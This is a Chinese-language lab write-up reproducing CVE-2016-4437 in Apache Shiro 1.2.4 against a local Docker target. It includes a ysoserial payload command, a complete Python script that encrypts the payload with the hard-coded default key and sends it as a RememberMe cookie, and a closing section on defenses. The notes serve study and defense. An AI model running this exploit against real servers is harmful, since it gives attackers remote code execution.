# Shiro 1.2.4 反序列化漏洞复现笔记

## 一、漏洞基础信息

1. **漏洞编号**：CVE-2016-4437

2. **影响版本**：Apache Shiro ≤ 1.2.4

3. 漏洞原理

   ：

   - Shiro 1.2.4 及以下版本使用**硬编码的默认密钥** `kPH+bIxk5D2deZiIxcaaaA==` 对 RememberMe Cookie 进行 AES 加密 / 解密。
   - 攻击者可构造恶意的反序列化数据，用默认密钥加密后传入 Cookie，服务端解密后执行反序列化操作，触发**远程代码执行（RCE）**。

   

4. **漏洞核心**：默认密钥泄露 + 反序列化无校验 → 命令执行。

## 二、复现环境

1. 攻击机：Kali Linux（安装 Python、Java、ysoserial）
2. 靶机：CentOS 7（部署 Shiro 1.2.4 测试环境）
3. 工具：
   - `ysoserial.jar`：生成反序列化 payload（Java 编写）
   - Python 脚本：加密 payload 并发送请求
   - ShiroAttack：图形界面化自动集成工具
4. 环境要求：靶机开启 8080 端口，Shiro 应用正常运行。

## 三、环境部署（靶机）

### 1. 部署 Shiro 1.2.4 测试应用

直接使用现成的漏洞环境（推荐）：

```
# 拉取漏洞环境镜像
docker pull medicean/vulapps:s_shiro_1
# 启动容器
docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1
```

访问 `http://靶机IP:8080`，出现 Shiro 登录页面即环境部署成功。

![image-20260326165438389](../images/image-20260326165438389.png)

## 四、漏洞复现步骤

## 方法一：

### 第一步：确认漏洞存在

1. 访问 Shiro 登录页面，随便输入账号密码，勾选 **Remember Me** 点击登录。

2. 抓包查看响应头，若存在 `rememberMe=deleteMe` 字段，**大概率存在漏洞**。

   ![image-20260326171935321](../images/image-20260326171935321.png)

### 第二步：准备工具

1. 下载 ysoserial.jar

   ```
   ysoserial.jar
   ```

2. 攻击机创建复现目录，将 `ysoserial.jar` 放入目录。

3. 准备Java8

   ![image-20260326174144837](../images/image-20260326174144837.png)

### 第三步：生成恶意 Payload

用 `ysoserial` 生成执行系统命令的 payload（这里以**执行 `calc`** 测试为例）：

```
# 命令格式：java -jar ysoserial.jar [利用链] [执行命令] > payload.bin
java -jar ysoserial-all.jar CommonsCollections5 "touch /tmp/success" > payload.bin
```

> 说明：Shiro 1.2.4 常用利用链：`CommonsCollections2`/`CommonsCollections5`/`CommonsCollections6`。

![image-20260326182209530](../images/image-20260326182209530.png)

### 第四步：加密 Payload（Python 脚本）

Shiro 要求 payload 先经 **AES-128-CBC** 加密（密钥：`kPH+bIxk5D2deZiIxcaaaA==`），编写 Python 脚本完成加密并发送请求：

```python
import base64
import uuid
from Crypto.Cipher import AES
import requests

# Shiro 1.2.4 默认密钥
KEY = "kPH+bIxk5D2deZiIxcaaaA=="
# 靶机地址
URL = "http://靶机IP:8080/login.jsp"

# AES 加密函数
def aes_encrypt(data, key):
    # 生成随机IV
    iv = uuid.uuid4().bytes
    # PKCS5Padding 填充
    pad = lambda s: s + (16 - len(s) % 16) * chr(16 - len(s) % 16).encode()
    data = pad(data)
    # AES-CBC 加密
    cipher = AES.new(base64.b64decode(key), AES.MODE_CBC, iv)
    encrypt_bytes = cipher.encrypt(data)
    # IV + 密文 组合后base64编码
    return base64.b64encode(iv + encrypt_bytes).decode()

# 读取生成的恶意payload
with open("payload.bin", "rb") as f:
    payload = f.read()

# 加密payload
rememberme_cookie = aes_encrypt(payload, KEY)
# 构造Cookie
cookies = {"rememberMe": rememberme_cookie}

# 发送请求
try:
    res = requests.get(URL, cookies=cookies, timeout=5)
    print("Payload 发送成功！")
    print("Cookie: rememberMe=" + rememberme_cookie)
except Exception as e:
    print("发送失败：", e)
```

#### 脚本依赖安装

```
pip install pycryptodome requests
```

### 第五步：执行漏洞利用

运行 Python 脚本，发送加密后的 Cookie。

**验证命令执行**：进入靶机 Docker 容器，查看 `/tmp` 目录

```
# 查看容器ID
docker ps
# 进入容器
docker exec -it 容器ID /bin/bash
# 查看文件是否创建
ls /tmp
```

若出现 `success` 文件，说明漏洞复现成功！

## 方法二：

打开ShiroAttack，并输入靶机url

<img src="../images/image-20260326181506385.png" alt="image-20260326181506385" style="zoom:67%;" />

开始命令执行

<img src="../images/image-20260326182009318.png" alt="image-20260326182009318" style="zoom: 67%;" />

## 五、漏洞防御方案

1. **升级 Shiro 版本**：升级到 ≥ 1.2.5 版本（官方修复了默认密钥问题）。
2. **修改默认密钥**：若无法升级，自定义 Shiro 的 RememberMe 密钥，**不要使用硬编码默认密钥**。
3. 部署 WAF：拦截恶意反序列化流量。
4. 禁用 RememberMe 功能（非必要场景）。

------

### 总结

1. 漏洞核心：Shiro ≤1.2.4 **默认密钥泄露** + 反序列化 → RCE。
2. 复现流程：部署环境 → 生成 payload → AES 加密 → 发送 Cookie → 命令执行。
3. 防御关键：升级版本 + 自定义密钥。